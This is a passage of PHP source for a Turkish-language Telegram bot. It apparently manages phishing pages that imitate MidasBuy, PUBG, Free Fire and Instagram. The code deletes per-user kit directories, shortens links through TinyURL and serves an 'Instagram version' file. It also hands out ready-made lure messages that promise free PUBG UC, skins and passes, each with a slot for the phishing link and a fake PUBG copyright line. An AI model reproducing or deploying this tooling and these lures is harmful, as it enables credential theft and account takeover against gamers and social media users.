",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎠 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 ، 💸' and file_exists("pubg/$id/m/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pubg/$id/m/*")));
unlink("database-links/$id/midasbuy");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🕯️ • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐' and !file_exists("pubg/$id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🕯️ • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐' and file_exists("pubg/$id/s/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pubg/$id/s/*")));
unlink("database-links/$id/spin");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎯 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🪔' and !file_exists("freefire/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎯 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🪔' and file_exists("freefire/$id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("freefire/$id/*")));
unlink("database-links/$id/freefire");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🔥 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲' and !file_exists("midas26/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🔥 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲' and file_exists("midas26/$id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("midas26/$id/*")));
unlink("database-links/$id/midas26");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎋 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🪐' and !file_exists("insta/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎋 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🪐' and file_exists("insta/$id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("insta/$id/*")));
unlink("database-links/$id/insta");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎋 • Premium Paketler , 🎠'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/72",
'caption'=>
"💣 • Hoşgeldin canım $name ، 👾

🪐 ، Bu bölüm promosyon uzantıları içindir , 🎉

🎊 ، Aşağıdaki klavyeyi kullanarak bölümler arasında gezinebilirsiniz. , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🀄 • Promosyon Resimleri ، 🎋',],['text'=>'🎠 • Promosyon klişeleri ، 🎪',]],
[['text'=>'📂 • Instagram ، 🎮',],['text'=>'🔗 • Link Kısaltıcı ، 📡️',]],
],'resize_keyboard'=>true,
])
]);
}


if($text !='🔗 • Link Kısaltıcı ، 📡'){
$short = file_get_contents("https://tinyurl.com/api-create.php?url=$text");
if($short != null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla kısaltıldı, 👋
➖➖➖➖➖➖➖➖➖➖
- 🔗 Orijinal bağlantı × 👇
$text
➖➖➖➖➖➖➖➖➖➖
- 🔗 Kısa bağlantı × 👇
$short
➖➖➖➖➖➖➖➖➖➖
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
}


if($text == '🔗 • Link Kısaltıcı ، 📡'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/77",
'caption'=>
"👨‍💻 • Kısaltmak için bağlantıyı şimdi gönderin ، 🦾
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}




if($text == '🎠 • Promosyon klişeleri ، 🎪'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/71",
'caption'=>
"👋 • Hoşgeldin canım $name , 💪

🎯 • Bu bölüm tanıtım klişelerine ayrılmıştır , 🎮

🎠 • Aşağıdaki klavyeden klişeleri seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'KalıpBasma 1 ، 🗿',],['text'=>'KalıpBasma 2 ، 🗿',]],
[['text'=>'KalıpBasma 3 ، 🗿',],['text'=>'KalıpBasma 4 ، 🗿',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == 'KalıpBasma 1 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Artık resmi web sitesinden 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 alabilirsiniz MidasBuy. 💣
UC 1500 + 375 çekebilirsiniz ve sadece bir kez çekebileceğinizi bilerek 1700 UC hesabınızda size ulaşacaktır. Ne duruyorsunuz... 🔥
şansını dene... 😱

• Bağlantıyı buraya koyا 🦅
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 2 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Silahlarınızı son şekle yükseltebilirsiniz ⚡ Ve hesabınız en güçlü olacak ⭐ Dünyada 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 3850' UC elde edin ! 💴 Her gün hesabınızı geliştirin ve arkadaşlarınızdan daha iyi performans gösterin 🔥 Şimdi Alışveriş Yap 🛒'a tıklayarak satın alın 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 Ücretsiz ve efsanevi görünümler 👻 Şimdi deneyin 😱 ve sezonu elde edin ve hayallerinizi şimdi gerçekleştirin 💸💸💸
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 3 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Şirket duyuruları PUBG MOBILE Bu sezon vesilesiyle değerli bir hediye sunarak PUBG MOBILE'ın tüm öğelerine kolayca sahip olabilirsiniz.

• M4 Joker'i ücretsiz edinin 
• Ücretsiz UC alın 8.100 - 24.000
• Ücretsiz bir nadir kıyafet seti alın
• Ücretsiz görünüm silahları alın M4
• Bedava Royale Pass Bu Sezon

• Bağlantıyı buraya koyا 🦅

Nasıl edinilir çok kolay aşağıdaki linke tıklayın
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 4 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"PUBG MOBİL HEDİYE, Ücretsiz Uc, Gun ve Free Skin🎁.

BAĞLANTIYI TIKLAYIN BURAYA ÜCRETSİZ UC EDİNİN👇

• Bağlantıyı buraya koyا 🦅

20 YORUMLAR 500 UC 💵
30 YORUMLAR 1000 UC💵
40 YORUMLAR 1500 UC💵
50 YORUMLAR 2000 UC💵
SHARE LINK 10000 UC💵

©2022 PUBG Corporation. All rights reversed. Privacy Policy | Tencent Games User Agreement
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}

if($text == '🀄 • Promosyon Resimleri ، 🎋'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/70",
'caption'=>
"🏝️ ~ Merhaba canım $name , 🎋

🎠 • Bu bölüm tanıtım fotoğrafları içindir ، 🏹

🪐 • Aşağıdaki klavyeden resimleri seçin ، 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'Resim 1 ، ⚜️',],['text'=>'Resim 2 ، ⚜️',]],
[['text'=>'Resim 3 ، ⚜️',],['text'=>'Resim 4 ، ⚜️',]],

],'resize_keyboard'=>true,
])
]);
}

if($text == 'Resim 1 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/57",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 1 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 2 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/58",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 2 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 3 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/59",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 3 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 4 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/60",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 4 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == '📂 • Instagram ، 🎮'){ 
bot('sendDocument',[
'chat_id'=>$chat_id,
'document'=>"https://t.me/DDH_I/65",
'caption'=>
"✅ • Instagram sürümü yüklendi X ، 🏜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == '/devteam'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/netspeciall/7",
'caption'=>
"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
👨‍💻 @HaKaNHZL - HOSTING ve DOMAIN
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
👨‍💻 @orkunergun - REPO Optimizer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
👨‍💻 @msalihpelit - FORMELY COMMANDER
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
👨‍💻 @serefsahingozz - BOT DESIGNER
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
👨‍💻 @mazenno7 - API ve PHP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
👨‍💻 @
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
👨‍💻 NETSKY STUDIO COMMUNITY 👨‍💻
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}

if($text == '/necoinbot'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/netspeciall/7",
'caption'=>
"☕ Bakiye Üzerine Yapılı Bot 👇
➖➖➖➖➖➖➖➖➖➖➖➖➖
   👉  💲 @NeCoinBot 📲   👈
➖➖➖➖➖➖➖➖➖➖➖➖➖
📡 Detaylar >> @o7mazenn <\>
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}

